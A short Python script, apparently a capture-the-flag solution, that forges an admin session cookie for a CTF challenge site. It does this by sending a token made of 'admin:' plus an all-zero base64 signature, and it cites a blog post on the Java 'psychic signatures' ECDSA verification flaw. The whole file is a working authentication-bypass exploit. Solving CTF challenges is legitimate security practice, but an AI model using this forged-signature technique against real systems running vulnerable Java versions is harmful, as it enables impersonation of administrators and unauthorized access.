import requests
import base64


#based on this https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/
res = requests.get("https://claim-whats-yours-98714197170.thsctf.site", 
                    cookies={"token": "admin:" + base64.b64encode(b"\0" * 64).decode('utf8')})

print(res.text)